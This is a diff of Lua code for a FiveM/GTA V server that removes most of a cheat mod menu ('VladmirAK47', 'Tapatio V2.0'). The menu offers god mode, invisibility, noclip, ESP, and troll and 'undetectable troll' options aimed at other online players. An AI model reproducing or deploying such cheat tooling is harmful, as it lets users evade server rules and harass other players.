-                dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.8), dv * (dr + 0.8))
-                local bL = GetEntityHeading(ds)
-                SetEntityVelocity(ds, 0.0, 0.0, 0.0)
-                SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false)
-                SetEntityHeading(ds, bL)
-                SetEntityCollision(ds, false, false)
-                SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true)
-                FreezeEntityPosition(ds, false)
-                SetEntityInvincible(ds, false)
-                SetEntityCollision(ds, true, true)
+            else
+                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
             end
         end
-    end
-)
+    end)
 Citizen.CreateThread(
     function()
-        FreezeEntityPosition(entity, false)
-        local dw = 1
-        local dx = true
-        local dy = nil
-        local dz = nil
-        local dA = nil
-        local dB = 1
-        local dC = 1
-        local dD = {
-            1.0,
-            2.0,
-            4.0,
-            10.0,
-            512.0,
-            9999.0
-        }
-        VladmirAK47.CreateMenu('VladmirAK47', '~b~123')
-        VladmirAK47.SetSubTitle('VladmirAK47', '~r~Tapatio® ~l~V2.0      💝 🎉 💕 ')
-        VladmirAK47.CreateSubMenu('SelfMenu', 'VladmirAK47', 'Self Options')
-        VladmirAK47.CreateSubMenu('TeleportMenu', 'VladmirAK47', 'Teleport Options')
-        VladmirAK47.CreateSubMenu('WeaponMenu', 'VladmirAK47', 'Weapon Options')
-        VladmirAK47.CreateSubMenu('MiscMenu', 'VladmirAK47', 'Advanced Options')
-        VladmirAK47.CreateSubMenu('ServerMenu', 'VladmirAK47', 'Server Options')
-        VladmirAK47.CreateSubMenu('VehicleMenu', 'VladmirAK47', 'Vehicle Options')
-        VladmirAK47.CreateSubMenu('OnlinePlayerMenu', 'VladmirAK47', 'Online Player Options')
-		VladmirAK47.CreateSubMenu('OnlinePlayerMenu1', 'VladmirAK47', 'All Players Options')
-        VladmirAK47.CreateSubMenu('SkinChange', 'SelfMenu', 'Skin')
-        VladmirAK47.CreateSubMenu('Animations', 'SelfMenu', 'Animations')
-        VladmirAK47.CreateSubMenu('Vision', 'SelfMenu', 'Vision')
-        VladmirAK47.CreateSubMenu('SuperPower', 'SelfMenu', 'Super Power')
-        VladmirAK47.CreateSubMenu('SuperPower1', 'SelfMenu', 'Ped Options')			
-        VladmirAK47.CreateSubMenu('Ride', 'SelfMenu', 'Ride Animals')		
-        VladmirAK47.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
-        VladmirAK47.CreateSubMenu('Destroyer', 'MiscMenu', 'Destroyer Options')
-        VladmirAK47.CreateSubMenu('Test10', 'ServerMenu', 'Under test')
-        VladmirAK47.CreateSubMenu('Vladmir1997', 'VladmirAK47', 'Credits')
-        VladmirAK47.CreateSubMenu('VehicleOptions', 'PlayerOptionsMenu', 'Force Power options')
-        VladmirAK47.CreateSubMenu('vehiclem', 'PlayerOptionsMenu', 'Vehicle Options')
-        VladmirAK47.CreateSubMenu('Trollmenu2', 'PlayerOptionsMenu', 'Undecetable Troll Options')		
-        VladmirAK47.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', 'Troll Options')
-        VladmirAK47.CreateSubMenu('WeaponTypes', 'WeaponMenu', 'Weapons')
-        VladmirAK47.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
-        VladmirAK47.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
-        VladmirAK47.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
-        VladmirAK47.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
-        VladmirAK47.CreateSubMenu('CarTypeSelection', 'CarTypes', '')
-        VladmirAK47.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
-        VladmirAK47.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
-        VladmirAK47.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
-        VladmirAK47.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
-        VladmirAK47.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', 'Single Weapon Options')
-        VladmirAK47.CreateSubMenu('ESPMenu', 'MiscMenu', 'ESP Options')
-        VladmirAK47.CreateSubMenu('MVE', 'VehicleMenu', 'Modded Vehicle')		
-        VladmirAK47.CreateSubMenu('LSC', 'VehicleMenu', 'LSC Customs')
-        VladmirAK47.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
-        VladmirAK47.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
-        VladmirAK47.CreateSubMenu('ObjectOptions', 'PlayerOptionsMenu', 'Object Options')
-		VladmirAK47.CreateSubMenu('SoundOptions', 'PlayerOptionsMenu', 'Sound Options')
-		VladmirAK47.CreateSubMenu('SuperPowerOptions', 'PlayerOptionsMenu', 'Super Power')		
-        VladmirAK47.CreateSubMenu('Pedstuff', 'PlayerOptionsMenu', 'Ped Options')		
-        VladmirAK47.CreateSubMenu('BoostMenu', 'VehicleMenu', 'Vehicle Boost')
-        VladmirAK47.CreateSubMenu('GCT', 'VehicleMenu', 'Global Car Trolls')
-        VladmirAK47.CreateSubMenu('CsMenu', 'MiscMenu', 'Crosshairs')
-        for i, dE in pairs(bl) do
-            VladmirAK47.CreateSubMenu(dE.id, 'tunings', dE.name)
-            if dE.id == 'paint' then
-                VladmirAK47.CreateSubMenu('primary', dE.id, 'Primary Paint')
-                VladmirAK47.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
-                VladmirAK47.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
-                VladmirAK47.CreateSubMenu('classic1', 'primary', 'Classic Paint')
-                VladmirAK47.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
-                VladmirAK47.CreateSubMenu('matte1', 'primary', 'Matte Paint')
-                VladmirAK47.CreateSubMenu('metal1', 'primary', 'Metal Paint')
-                VladmirAK47.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
-                VladmirAK47.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
-                VladmirAK47.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
-                VladmirAK47.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
-                VladmirAK47.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
-                VladmirAK47.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
-                VladmirAK47.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
-                VladmirAK47.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
-            end
-        end
-        for i, dE in pairs(bm) do
-            VladmirAK47.CreateSubMenu(dE.id, 'performance', dE.name)
-        end
-        local SelectedPlayer
-        while bw do
-            ped = PlayerPedId()
-            veh = GetVehiclePedIsUsing(ped)
-            SetVehicleModKit(veh, 0)
-            for i, dE in pairs(bl) do
-                if VladmirAK47.IsMenuOpened('tunings') then
-                    if bg then
-                        if bi == 'neon' then
-                            local r, g, b = table.unpack(bh)
-                            SetVehicleNeonLightsColour(veh, r, g, b)
-                            SetVehicleNeonLightEnabled(veh, 0, bk)
-                            SetVehicleNeonLightEnabled(veh, 1, bk)
-                            SetVehicleNeonLightEnabled(veh, 2, bk)
-                            SetVehicleNeonLightEnabled(veh, 3, bk)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        elseif bi == 'paint' then
-                            local dF, dG, dH, dI = table.unpack(bh)
-                            SetVehicleColours(veh, dF, dG)
-                            SetVehicleExtraColours(veh, dH, dI)
-                            bg = false
-                            bi = -1
-                            bh = -1
-                        else
-                            if bk == 'rm' then
-                                RemoveVehicleMod(veh, bi)
-                                bg = false
-                                bi = -1
-                                bh = -1
-                            else
-                                SetVehicleMod(veh, bi, bh, false)
-                                bg = false
-                                bi = -1
-                                bh = -1
-                            end
-                        end
-                    end
-                end
-                if VladmirAK47.IsMenuOpened(dE.id) then
-                    if dE.id == 'wheeltypes' then
-                        if VladmirAK47.Button('Sport Wheels') then
-                            SetVehicleWheelType(veh, 0)
-                        elseif VladmirAK47.Button('Muscle Wheels') then
-                            SetVehicleWheelType(veh, 1)
-                        elseif VladmirAK47.Button('Lowrider Wheels') then
-                            SetVehicleWheelType(veh, 2)
-                        elseif VladmirAK47.Button('SUV Wheels') then
-                            SetVehicleWheelType(veh, 3)
-                        elseif VladmirAK47.Button('Offroad Wheels') then
-                            SetVehicleWheelType(veh, 4)
-                        elseif VladmirAK47.Button('Tuner Wheels') then
-                            SetVehicleWheelType(veh, 5)
-                        elseif VladmirAK47.Button('High End Wheels') then
-                            SetVehicleWheelType(veh, 7)
-                        end
-                        VladmirAK47.Display()
-                    elseif dE.id == 'extra' then
-                        local dJ = checkValidVehicleExtras()
-                        for i, dE in pairs(dJ) do
-                            if IsVehicleExtraTurnedOn(veh, i) then
-                                pricestring = 'Installed'
-                            else
-                                pricestring = 'Not Installed'
-                            end
-                            if VladmirAK47.Button(dE.menuName, pricestring) then
-                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
-                            end
-                        end
-                        VladmirAK47.Display()
-                    elseif dE.id == 'headlight' then
-                        if VladmirAK47.Button('None') then
-                            SetVehicleHeadlightsColour(veh, -1)
-                        end
-                        for dK, dE in pairs(bo) do
-                            tp = GetVehicleHeadlightsColour(veh)
-                            if tp == dE.id and not bg then
-                                pricetext = 'Installed'
-                            else
-                                if bg and tp == dE.id then
-                                    pricetext = 'Previewing'
-                                else
-                                    pricetext = 'Not Installed'
-                                end
-                            end
-                            head = GetVehicleHeadlightsColour(veh)
-                            if VladmirAK47.Button(dE.name, pricetext) then
-                                if not bg then
-                                    bi = 'headlight'
-                                    bk = false
-                                    oldhead = GetVehicleHeadlightsColour(veh)
-                                    bh = table.pack(oldhead)
-                                    SetVehicleHeadlightsColour(veh, dE.id)
-                                    bg = true
-                                elseif bg and head == dE.id then
-                                    ToggleVehicleMod(veh, 22, true)
-                                    SetVehicleHeadlightsColour(veh, dE.id)
-                                    bg = false
-                                    bi = -1
-                                    bh = -1
-                                elseif bg and head ~= dE.id then
-                                    SetVehicleHeadlightsColour(veh, dE.id)
-                                    bg = true
-                                end
-                            end
-                        end
-                        VladmirAK47.Display()
-                    elseif dE.id == 'licence' then
-                        if VladmirAK47.Button('None') then
-                            SetVehicleNumberPlateTextIndex(veh, 3)
-                        end
-                        for dK, dE in pairs(bn) do
-                            tp = GetVehicleNumberPlateTextIndex(veh)
-                            if tp == dE.id and not bg then
-                                pricetext = 'Installed'
-                            else
-                                if bg and tp == dE.id then
-                                    pricetext = 'Previewing'
-                                else
-                                    pricetext = 'Not Installed'
-                                end
-                            end
-                            plate = GetVehicleNumberPlateTextIndex(veh)
-                            if VladmirAK47.Button(dE.name, pricetext) then
-                                if not bg then
-                                    bi = 'headlight'
-                                    bk = false
-                                    oldhead = GetVehicleNumberPlateTextIndex(veh)
-                                    bh = table.pack(oldhead)
-                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
-                                    bg = true
-                                elseif bg and plate == dE.id then
-                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
-                                    bg = false
-                                    bi = -1
-                                    bh = -1
-                                elseif bg and plate ~= dE.id then
-                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
-                                    bg = true
-                                end
-                            end
-                        end
-                        VladmirAK47.Display()
-                    elseif dE.id == 'neon' then
-                        if VladmirAK47.Button('None') then
-                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
-                            SetVehicleNeonLightEnabled(veh, 0, false)
-                            SetVehicleNeonLightEnabled(veh, 1, false)
-                            SetVehicleNeonLightEnabled(veh, 2, false)
-                            SetVehicleNeonLightEnabled(veh, 3, false)
-                        end
-                        for i, dE in pairs(bq) do
-                            colorr, colorg, colorb = table.unpack(dE)
-                            r, g, b = GetVehicleNeonLightsColour(veh)
-                            if
-                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
-                                    not bg
-                             then
-                                pricestring = 'Installed'
-                            else
-                                if bg and colorr == r and colorg == g and colorb == b then
-                                    pricestring = 'Previewing'
-                                else
-                                    pricestring = 'Not Installed'
-                                end
-                            end
-                            if VladmirAK47.Button(i, pricestring) then
-                                if not bg then
-                                    bi = 'neon'
-                                    bk = IsVehicleNeonLightEnabled(veh, 1)
-                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
-                                    bh = table.pack(oldr, oldg, oldb)
-                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
-                                    SetVehicleNeonLightEnabled(veh, 0, true)
-                                    SetVehicleNeonLightEnabled(veh, 1, true)
-                                    SetVehicleNeonLightEnabled(veh, 2, true)
-                                    SetVehicleNeonLightEnabled(veh, 3, true)
-                                    bg = true
-                                elseif bg and colorr == r and colorg == g and colorb == b then
-                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
-                                    SetVehicleNeonLightEnabled(veh, 0, true)
-                                    SetVehicleNeonLightEnabled(veh, 1, true)
-                                    SetVehicleNeonLightEnabled(veh, 2, true)
-                                    SetVehicleNeonLightEnabled(veh, 3, true)
-                                    bg = false
-                                    bi = -1
-                                    bh = -1
-                                elseif bg and colorr ~= r or colorg ~= g or colorb ~= b then
-                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
-                                    SetVehicleNeonLightEnabled(veh, 0, true)
-                                    SetVehicleNeonLightEnabled(veh, 1, true)
-                                    SetVehicleNeonLightEnabled(veh, 2, true)
-                                    SetVehicleNeonLightEnabled(veh, 3, true)
-                                    bg = true
-                                end
-                            end
-                        end
-                        VladmirAK47.Display()
-                    elseif dE.id == 'paint' then
-                        if VladmirAK47.MenuButton('~h~~p~▶~s~ Primary Paint', 'primary') then
-                        elseif VladmirAK47.MenuButton('~h~~p~▶~s~ Secondary Paint', 'secondary') then
-                        elseif VladmirAK47.MenuButton('~h~~p~▶~s~ Wheel Paint', 'rimpaint') then
-                        end
-                        VladmirAK47.Display()
-                    else
-                        local az = checkValidVehicleMods(dE.id)
-                        for i, dL in pairs(az) do
-                            for dM, dN in pairs(bp) do
-                                if dM == dE.name and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
-                                    price = 'Not Installed'
-                                elseif dM == dE.name and bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
-                                    price = 'Previewing'
-                                elseif dM == dE.name and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
-                                    price = 'Installed'
-                                end
-                            end
-                            if dL.menuName == '~h~~b~Stock' then
-                            end
-                            if dE.name == 'Horns' then
-                                for dO, dP in pairs(bp) do
-                                    if dP == ci - 1 then
-                                        dL.menuName = dO
-                                    end
-                                end
-                            end
-                            if dL.menuName == 'NULL' then
-                                dL.menuName = 'unknown'
-                            end
-                            if VladmirAK47.Button(dL.menuName) then
-                                if not bg then
-                                    bi = dE.id
-                                    bh = GetVehicleMod(veh, dE.id)
-                                    bg = true
-                                    if dL.data.realIndex == -1 then
-                                        bk = 'rm'
-                                        RemoveVehicleMod(veh, dL.data.modid)
-                                        bg = false
-                                        bi = -1
-                                        bh = -1
-                                        bk = false
-                                    else
-                                        bk = false
-                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
-                                    end
-                                elseif bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
-                                    bg = false
-                                    bi = -1
-                                    bh = -1
-                                    bk = false
-                                    if dL.data.realIndex == -1 then
-                                        RemoveVehicleMod(veh, dL.data.modid)
-                                    else
-                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
-                                    end
-                                elseif bg and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
-                                    if dL.data.realIndex == -1 then
-                                        RemoveVehicleMod(veh, dL.data.modid)
-                                        bg = false
-                                        bi = -1
-                                        bh = -1
-                                        bk = false
-                                    else
-                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
-                                        bg = true
-                                    end
-                                end
-                            end
-                        end
-                        VladmirAK47.Display()
-                    end
-                end
-            end
-            for i, dE in pairs(bm) do
-                if VladmirAK47.IsMenuOpened(dE.id) then
-                    if GetVehicleMod(veh, dE.id) == 0 then
-                        pricestock = 'Not Installed'
-                        price1 = 'Installed'
-                        price2 = 'Not Installed'
-                        price3 = 'Not Installed'
-                        price4 = 'Not Installed'
-                    elseif GetVehicleMod(veh, dE.id) == 1 then
-                        pricestock = 'Not Installed'
-                        price1 = 'Not Installed'
-                        price2 = 'Installed'
-                        price3 = 'Not Installed'
-                        price4 = 'Not Installed'
-                    elseif GetVehicleMod(veh, dE.id) == 2 then
-                        pricestock = 'Not Installed'
-                        price1 = 'Not Installed'
-                        price2 = 'Not Installed'
-                        price3 = 'Installed'
-                        price4 = 'Not Installed'
-                    elseif GetVehicleMod(veh, dE.id) == 3 then
-                        pricestock = 'Not Installed'
-                        price1 = 'Not Installed'
-                        price2 = 'Not Installed'
-                        price3 = 'Not Installed'
-                        price4 = 'Installed'
-                    elseif GetVehicleMod(veh, dE.id) == -1 then
-                        pricestock = 'Installed'
-                        price1 = 'Not Installed'
-                        price2 = 'Not Installed'
-                        price3 = 'Not Installed'
-                        price4 = 'Not Installed'
-                    end
-                    if VladmirAK47.Button('Stock ' .. dE.name, pricestock) then
-                        SetVehicleMod(veh, dE.id, -1)
-                    elseif VladmirAK47.Button(dE.name .. ' Upgrade 1', price1) then
-                        SetVehicleMod(veh, dE.id, 0)
-                    elseif VladmirAK47.Button(dE.name .. ' Upgrade 2', price2) then
-                        SetVehicleMod(veh, dE.id, 1)
-                    elseif VladmirAK47.Button(dE.name .. ' Upgrade 3', price3) then
-                        SetVehicleMod(veh, dE.id, 2)
-                    elseif dE.id ~= 13 and dE.id ~= 12 and VladmirAK47.Button(dE.name .. ' Upgrade 4', price4) then
-                        SetVehicleMod(veh, dE.id, 3)
-                    end
-                    VladmirAK47.Display()
-                end
-            end
-            if VladmirAK47.IsMenuOpened('VladmirAK47') then
-                local dQ = PlayerId(-1)
-                local bH = GetPlayerName(dQ)
-                --av('VladmirAK47(eta)', true)
-                if VladmirAK47.MenuButton('~h~~y~⚡~s~ Self Options', 'SelfMenu') then
-                elseif VladmirAK47.MenuButton('~h~~b~💘~s~ Online Players Options ', 'OnlinePlayerMenu') then
-				elseif VladmirAK47.MenuButton('~h~~b~☢~s~ All Players Options', 'OnlinePlayerMenu1') then
-                elseif VladmirAK47.MenuButton('~h~~b~⌛~s~ Teleport Options', 'TeleportMenu') then
-                elseif VladmirAK47.MenuButton('~h~~b~✈~s~ Vehicle Options', 'VehicleMenu') then
-                elseif VladmirAK47.MenuButton('~h~~b~🔫~s~ Weapon Options', 'WeaponMenu') then
-                elseif VladmirAK47.MenuButton('~h~~b~⚠~s~ Misc Options', 'MiscMenu') then 
-                elseif VladmirAK47.MenuButton('~h~~b~👑~s~ Credits', 'Vladmir1997') then
-                elseif VladmirAK47.Button('~h~~b~🙈~r~ Disconnect') then
-                    H4tuf5 = false
-                end
-                if H4tuf5 then
-                    VladmirAK47.Display()
-                end
-            elseif VladmirAK47.IsMenuOpened('SelfMenu') then
-				if VladmirAK47.MenuButton('~h~~r~▶~s~ Skin', 'SkinChange') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Animations', 'Animations') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Ride Animales', 'Ride') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Vision', 'Vision') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Super Power', 'SuperPower') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Ped Options', 'SuperPower1') then
-				elseif VladmirAK47.Button("~h~Revive") then
-				RRR3()
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~God mode',
-                        INV3,
-                        function(dR)
-                            INV3 = dR
-                        end
-                    )
-                 then				
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Go to sky',
-                        sup,
-                        function(dR)
-                            sup = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~No Ragdoll',
-                        Ragdoll,
-                        function(dR)
-                            Ragdoll = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Invisible',
-                        AAA1,
-                        function(dR)
-                            AAA1 = dR
-                        end
-                    )
-                 then				 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Infinite Stamina',
-                        InfStamina,
-                        function(dR)
-                            InfStamina = dR
-                        end
-                    )
-                 then				 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Fast Run',
-                        fastrun,
-                        function(dR)
-                            fastrun = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Super Jump',
-                        SuperJump,
-                        function(dR)
-                            SuperJump = dR
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Airbrk',
-                        Noclip,
-                        function(dR)
-                            Noclip = dR
-                        end
-                    )
-                 then				 									
-                end
-								VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Vision') then
-			    if VladmirAK47.Button('~h~Clear Vision') then
-			      ClearTimecycleModifier()
-                elseif VladmirAK47.Button('~h~Weed') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("DRUG_gas_huffin")	
-                elseif VladmirAK47.Button('~h~Drug') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("Drug_deadman_blend")
-                elseif VladmirAK47.Button('~h~Dead man') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("Glasses_BlackOut")
-                elseif VladmirAK47.Button('~h~Coccaine') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("ArenaEMP_Blend")
-                elseif VladmirAK47.Button('~h~Zombie') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("Hicksbar")
-                elseif VladmirAK47.Button('~h~Desert') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("DRUG_2_drive")
-                elseif VladmirAK47.Button('~h~Cross Line') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("CrossLine02")
-                elseif VladmirAK47.Button('~h~Light Red') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("DeadlineNeon01")
-                elseif VladmirAK47.Button('~h~Dark Blue') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("BulletTimeDark")	
-                elseif VladmirAK47.Button('~h~Broken Camera') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("Broken_camera_fuzz")
-                elseif VladmirAK47.Button('~h~Cold') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("BombCamFlash")
-                elseif VladmirAK47.Button('~h~Yellow') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("BleepYellow02")
-                elseif VladmirAK47.Button('~h~Not Clear') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("BlackOut")
-                elseif VladmirAK47.Button('~h~1907') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("BikersSPLASH")
-                elseif VladmirAK47.Button('~h~Green') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("AirRaceBoost02")
-                elseif VladmirAK47.Button('~h~EMP') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("ArenaEMP")
-                elseif VladmirAK47.Button('~h~Old Tv') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("CAMERA_secuirity")
-                elseif VladmirAK47.Button('~h~White') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("LostTimeFlash")					 
-                elseif VladmirAK47.Button('~h~Purple') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("PPPurple01")
-                elseif VladmirAK47.Button('~h~Ufo') then
-	  	         local ped = GetPlayerPed(-1)
-		 		  SetPedIsDrunk(ped, true)
-			     SetTimecycleModifier("ufo")					 
-                end
-								VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('SuperPower1') then
-				if VladmirAK47.Button('~h~Invisble car') then
-				    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
-					   local veh = GetVehiclePedIsIn(GetPlayerPed(-1), true)
-					   SetEntityVisible(veh, false, 0)
-					end
-				elseif VladmirAK47.Button('~h~Driver For you') then
-                    local veh = ("police")
-					local target = PlayerPedId(-1)
-                    local pos = GetEntityCoords(GetPlayerPed(-1))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_f_y_bartender_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_f_y_bartender_01') do
-                        RequestModel('s_f_y_bartender_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        local v = CreateVehicle(veh, pos.x, pos.y, pos.z, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('s_f_y_bartender_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('s_f_y_bartender_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('s_f_y_bartender_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-									SetPedIntoVehicle(target, v, 0)
-									SetEntityVisible(ped, false, true)
-									TaskVehicleDriveWander(ped, v, 100.00, 786468)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-				elseif VladmirAK47.Button('~h~Crazy Pilot for you') then
-                    local veh = ("Shamal")
-					local target = PlayerPedId(-1)
-                    local pos = GetEntityCoords(GetPlayerPed(-1))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_f_y_bartender_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_f_y_bartender_01') do
-                        RequestModel('s_f_y_bartender_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        local v = CreateVehicle(veh, pos.x, pos.y, pos.z + 800, GetEntityHeading(target), true, true)
-						local v1 = CreateVehicle(veh, 1540, 3200, 40, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) and DoesEntityExist(v1) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('s_f_y_bartender_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('s_f_y_bartender_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('s_f_y_bartender_01'), pos.x, pos.y, pos.z, true, true)
-								local ped1 = CreatePed(21, GetHashKey('s_f_y_bartender_01'), pos.x, pos.y, pos.z, true, true)								
-                                if DoesEntityExist(ped) and DoesEntityExist(ped1) then
-                                    SetPedIntoVehicle(ped, v, -1)
-									SetPedIntoVehicle(ped1, v1, -1)
-									SetPedIntoVehicle(target, v, 0)
-									SetEntityVisible(ped, false, true)
-									TaskPlaneChase(ped, v1, 100.00, 786468)									
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-				elseif VladmirAK47.Button('~h~Planes surf above you') then
-                    local veh = ("Shamal")
-					local target = PlayerPedId(-1)
-                    local pos = GetEntityCoords(GetPlayerPed(-1))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_f_y_bartender_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_f_y_bartender_01') do
-                        RequestModel('s_f_y_bartender_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        local v = CreateVehicle(veh, pos.x, pos.y + 300, pos.z + 700, GetEntityHeading(target), true, true)
-						local v1 = CreateVehicle(veh, pos.x + 300, pos.y, pos.z + 800, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) and DoesEntityExist(v1) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('s_f_y_bartender_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('s_f_y_bartender_01') then
-                                Citizen.Wait(50)
